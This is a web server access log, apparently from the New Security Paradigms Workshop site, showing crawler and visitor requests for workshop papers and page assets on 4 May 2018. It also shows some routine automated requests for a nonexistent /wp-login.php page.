197.245.30.212 - - [04/May/2018:05:07:41 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [04/May/2018:05:07:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
197.245.30.212 - - [04/May/2018:05:07:43 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
49.195.102.189 - - [04/May/2018:05:08:36 -0400] "GET /papers/2007/nspw2007-vidyaraman.pdf HTTP/1.1" 200 259144 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
49.195.102.189 - - [04/May/2018:05:08:38 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 3943 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
49.195.102.189 - - [04/May/2018:05:08:38 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
49.195.102.189 - - [04/May/2018:05:08:38 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
49.195.102.189 - - [04/May/2018:05:08:38 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
49.195.102.189 - - [04/May/2018:05:08:39 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
49.195.102.189 - - [04/May/2018:05:08:39 -0400] "GET /apple-touch-icon-120x120-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
49.195.102.189 - - [04/May/2018:05:08:39 -0400] "GET /apple-touch-icon-120x120.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
49.195.102.189 - - [04/May/2018:05:08:40 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
49.195.102.189 - - [04/May/2018:05:08:40 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
49.195.102.189 - - [04/May/2018:05:08:40 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
66.249.64.217 - - [04/May/2018:05:08:45 -0400] "GET / HTTP/1.1" 200 6608 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
117.229.58.8 - - [04/May/2018:05:09:09 -0400] "GET /wp-login.php HTTP/1.1" 404 8180 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
117.229.58.8 - - [04/May/2018:05:09:10 -0400] "GET / HTTP/1.1" 200 8298 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
117.24.36.86 - - [04/May/2018:05:09:12 -0400] "GET /papers/2006/nspw2006-wang.pdf HTTP/1.1" 200 513923 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
117.24.36.86 - - [04/May/2018:05:09:59 -0400] "GET /papers/2006/nspw2006-wang.pdf HTTP/1.1" 200 510833 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
117.24.36.86 - - [04/May/2018:05:10:18 -0400] "GET /papers/2006/nspw2006-wang.pdf HTTP/1.1" 200 510833 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
117.24.36.86 - - [04/May/2018:05:10:24 -0400] "GET /papers/2006/nspw2006-wang.pdf HTTP/1.1" 200 510833 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
117.24.36.86 - - [04/May/2018:05:10:35 -0400] "GET /papers/2006/nspw2006-wang.pdf HTTP/1.1" 200 510833 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
117.24.36.86 - - [04/May/2018:05:10:44 -0400] "GET /papers/2006/nspw2006-wang.pdf HTTP/1.1" 200 510833 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
216.244.66.247 - - [04/May/2018:05:11:40 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
69.162.124.227 - - [04/May/2018:05:12:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
216.244.66.236 - - [04/May/2018:05:14:15 -0400] "GET /robots.txt HTTP/1.1" 200 5796 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
41.160.233.82 - - [04/May/2018:05:16:26 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.64.15 - - [04/May/2018:05:16:27 -0400] "GET /2010/cfp HTTP/1.1" 200 8326 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
41.160.233.82 - - [04/May/2018:05:16:29 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
77.88.47.40 - - [04/May/2018:05:16:24 -0400] "GET /papers/1999/nspw1999-povey.pdf HTTP/1.1" 200 587422 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [04/May/2018:05:17:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
77.88.47.40 - - [04/May/2018:05:18:31 -0400] "GET /papers/2010/nspw2010-molnar.pdf HTTP/1.1" 200 434030 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
59.106.108.116 - - [04/May/2018:05:19:37 -0400] "HEAD /current/ HTTP/1.1" 200 3904 "-" "Hatena Antenna/0.5 (http://a.hatena.ne.jp/help)"
59.106.108.116 - - [04/May/2018:05:19:39 -0400] "GET /current/ HTTP/1.1" 200 12401 "-" "Hatena Antenna/0.5 (http://a.hatena.ne.jp/help)"
65.49.2.177 - - [04/May/2018:05:20:21 -0400] "GET /2007/submission.shtml HTTP/1.1" 200 5140 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [04/May/2018:05:20:30 -0400] "GET /2007/local.shtml HTTP/1.1" 200 5904 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [04/May/2018:05:20:38 -0400] "GET /2007/pc.shtml HTTP/1.1" 200 5645 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [04/May/2018:05:20:47 -0400] "GET /2007/cfp.shtml HTTP/1.1" 200 8119 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [04/May/2018:05:20:55 -0400] "GET /2007/index.shtml HTTP/1.1" 200 5179 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [04/May/2018:05:21:03 -0400] "GET /2007/program.shtml HTTP/1.1" 200 6286 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
82.35.81.229 - - [04/May/2018:05:21:08 -0400] "GET /papers/2013/nspw2013-somayaji.pdf HTTP/1.1" 200 373404 "-" "Mozilla/5.0 (iPad; CPU OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.0 Mobile/15E148 Safari/604.1"
82.35.81.229 - - [04/May/2018:05:21:09 -0400] "GET /apple-touch-icon-152x152-precomposed.png HTTP/1.1" 404 3943 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
82.35.81.229 - - [04/May/2018:05:21:09 -0400] "GET /apple-touch-icon-152x152.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
82.35.81.229 - - [04/May/2018:05:21:09 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
66.249.64.215 - - [04/May/2018:05:21:09 -0400] "GET /2017 HTTP/1.1" 200 7050 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
82.35.81.229 - - [04/May/2018:05:21:10 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
82.35.81.229 - - [04/May/2018:05:21:10 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
82.35.81.229 - - [04/May/2018:05:21:10 -0400] "GET /apple-touch-icon-152x152-precomposed.png HTTP/1.1" 404 729 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
82.35.81.229 - - [04/May/2018:05:21:10 -0400] "GET /apple-touch-icon-152x152.png HTTP/1.1" 404 717 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
82.35.81.229 - - [04/May/2018:05:21:10 -0400] "GET /apple-touch-icon-precomposed.png HTTP/1.1" 404 721 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
82.35.81.229 - - [04/May/2018:05:21:10 -0400] "GET /apple-touch-icon.png HTTP/1.1" 404 709 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
82.35.81.229 - - [04/May/2018:05:21:10 -0400] "GET /favicon.ico HTTP/1.1" 404 700 "-" "MobileSafari/604.1 CFNetwork/897.15 Darwin/17.5.0"
65.49.2.177 - - [04/May/2018:05:21:12 -0400] "GET /2007/past.shtml HTTP/1.1" 200 5443 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [04/May/2018:05:21:21 -0400] "GET /2007/papers.shtml HTTP/1.1" 200 5407 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
197.96.72.154 - - [04/May/2018:05:21:26 -0400] "GET /wp-login.php HTTP/1.1" 404 7491 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
197.96.72.154 - - [04/May/2018:05:21:29 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
65.49.2.177 - - [04/May/2018:05:21:31 -0400] "GET /2007/dates.shtml HTTP/1.1" 200 4818 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
65.49.2.177 - - [04/May/2018:05:21:40 -0400] "GET /2007/oc.shtml HTTP/1.1" 200 5109 "-" "Mozilla/5.0 (compatible; Go-http-client/1.1; +centurybot9@gmail.com)"
157.55.39.142 - - [04/May/2018:05:22:11 -0400] "GET /papers/2012/docs/p43.pdf HTTP/1.1" 200 850439 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [04/May/2018:05:22:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
5.196.87.138 - - [04/May/2018:05:22:50 -0400] "GET /robots.txt HTTP/1.1" 200 4297 "-" "Mozilla/5.0 (compatible; AhrefsBot/5.2; +http://ahrefs.com/robot/)"
95.26.92.231 - - [04/May/2018:05:22:12 -0400] "GET /papers/2010/nspw2010-moore.pdf HTTP/1.1" 200 741159 "http://pdf.ebook777.com/052/0199918090.pdf" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)"
216.244.66.236 - - [04/May/2018:05:25:01 -0400] "GET /papers/1998/?C=S;O=D HTTP/1.1" 200 7126 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)"
207.46.13.141 - - [04/May/2018:05:26:51 -0400] "GET /papers/1993/nspw1993-bailey.pdf HTTP/1.1" 200 506903 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
69.162.124.227 - - [04/May/2018:05:27:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
144.82.8.101 - - [04/May/2018:05:28:32 -0400] "GET /2009/proceedings/2008/nspw2008-beautement.pdf HTTP/1.1" 200 137268 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
144.82.8.101 - - [04/May/2018:05:28:32 -0400] "GET /2009/proceedings/2008/nspw2008-beautement.pdf HTTP/1.1" 200 766163 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
112.134.135.73 - - [04/May/2018:05:28:52 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
112.134.135.73 - - [04/May/2018:05:28:54 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
86.98.10.48 - - [04/May/2018:05:32:41 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [04/May/2018:05:32:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
86.98.10.48 - - [04/May/2018:05:32:43 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.64.215 - - [04/May/2018:05:32:59 -0400] "GET / HTTP/1.1" 200 6606 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
78.182.14.115 - - [04/May/2018:05:33:30 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
78.182.14.115 - - [04/May/2018:05:33:30 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
66.249.64.217 - - [04/May/2018:05:33:34 -0400] "GET /2016/program HTTP/1.1" 200 7445 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.142 - - [04/May/2018:05:34:45 -0400] "GET /papers/1994/nspw1994-bertino.pdf HTTP/1.1" 200 542554 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.141 - - [04/May/2018:05:36:11 -0400] "GET /2016 HTTP/1.1" 200 7439 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
40.77.177.164 - - [04/May/2018:05:36:12 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 9188 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.177.164 - - [04/May/2018:05:36:12 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 2400 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.179.52 - - [04/May/2018:05:36:13 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 4690 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.177.226 - - [04/May/2018:05:36:14 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 7470 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.177.82 - - [04/May/2018:05:36:14 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 3912 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.177.164 - - [04/May/2018:05:36:14 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 478 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.177.82 - - [04/May/2018:05:36:14 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 2192 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.178.31 - - [04/May/2018:05:36:15 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 24576 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.179.52 - - [04/May/2018:05:36:15 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 1383 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.179.234 - - [04/May/2018:05:36:16 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 6747 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.177.219 - - [04/May/2018:05:36:16 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 24023 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
77.88.47.40 - - [04/May/2018:05:37:37 -0400] "GET /2013/program HTTP/1.1" 200 7344 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
69.162.124.227 - - [04/May/2018:05:37:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
80.189.236.249 - - [04/May/2018:05:37:57 -0400] "GET /wp-login.php HTTP/1.1" 404 7985 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
80.189.236.249 - - [04/May/2018:05:37:58 -0400] "GET / HTTP/1.1" 200 8206 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
64.62.252.163 - - [04/May/2018:05:38:03 -0400] "GET /robots.txt HTTP/1.1" 200 4444 "-" "The Knowledge AI"
66.249.64.217 - - [04/May/2018:05:38:45 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 5928 "-" "Googlebot-Image/1.0"
84.1.150.218 - - [04/May/2018:05:37:47 -0400] "GET /papers/2009/nspw2009-gibson.pdf HTTP/1.0" 200 1152962 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
112.206.66.174 - - [04/May/2018:05:41:10 -0400] "GET /wp-login.php HTTP/1.1" 404 7839 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
112.206.66.174 - - [04/May/2018:05:41:11 -0400] "GET / HTTP/1.1" 200 8218 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1"
69.162.124.227 - - [04/May/2018:05:42:42 -0400] "HEAD / HTTP/1.1" 200 3874 "http://nspw.org/" "Mozilla/5.0+(compatible; UptimeRobot/2.0; http://www.uptimerobot.com/)"
66.249.64.215 - - [04/May/2018:05:45:59 -0400] "GET /papers/2001/nspw2001-blakley.pdf HTTP/1.1" 304 3605 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
111.204.219.195 - - [04/May/2018:05:46:33 -0400] "GET /2018 HTTP/1.1" 200 6921 "https://www.baidu.com/link?url=ilf0pT-FHy6rlhVDpE4RIEcRuY8TfLC9c42ay5iF_nJ91u-t2kI4pcDiF0aH3ra4&wd=&eqid=cafb7b360001fefb000000025aec2bf4" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:33 -0400] "GET /modules/system/system.menus.css?p7r9uw HTTP/1.1" 200 1025 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:33 -0400] "GET /modules/system/system.base.css?p7r9uw HTTP/1.1" 200 5716 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:34 -0400] "GET /modules/system/system.theme.css?p7r9uw HTTP/1.1" 200 1585 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:34 -0400] "GET /modules/system/system.messages.css?p7r9uw HTTP/1.1" 200 746 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:34 -0400] "GET /modules/node/node.css?p7r9uw HTTP/1.1" 200 597 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:34 -0400] "GET /modules/comment/comment.css?p7r9uw HTTP/1.1" 200 630 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:34 -0400] "GET /themes/garland/style.css?p7r9uw HTTP/1.1" 200 5370 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:34 -0400] "GET /misc/jquery.once.js?v=1.2 HTTP/1.1" 200 1570 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:34 -0400] "GET /themes/garland/print.css?p7r9uw HTTP/1.1" 200 771 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:34 -0400] "GET /misc/drupal.js?p7r9uw HTTP/1.1" 200 7497 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:34 -0400] "GET /sites/default/files/nspw-logo-smaller.jpg HTTP/1.1" 200 2534 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:34 -0400] "GET /misc/jquery.js?v=1.4.4 HTTP/1.1" 200 27601 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:34 -0400] "GET /modules/field/theme/field.css?p7r9uw HTTP/1.1" 200 724 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:34 -0400] "GET /modules/user/user.css?p7r9uw HTTP/1.1" 200 1187 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:35 -0400] "GET /themes/garland/images/bg-navigation-item.png HTTP/1.1" 200 812 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:35 -0400] "GET /themes/garland/images/menu-expanded.gif HTTP/1.1" 200 495 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:35 -0400] "GET /themes/garland/images/menu-collapsed.gif HTTP/1.1" 200 488 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:35 -0400] "GET /themes/garland/images/bg-navigation-item-hover.png HTTP/1.1" 200 754 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:35 -0400] "GET /themes/garland/images/menu-leaf.gif HTTP/1.1" 200 486 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
111.204.219.195 - - [04/May/2018:05:46:35 -0400] "GET /themes/garland/images/body.png HTTP/1.1" 200 993 "https://www.nspw.org/2018" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299"
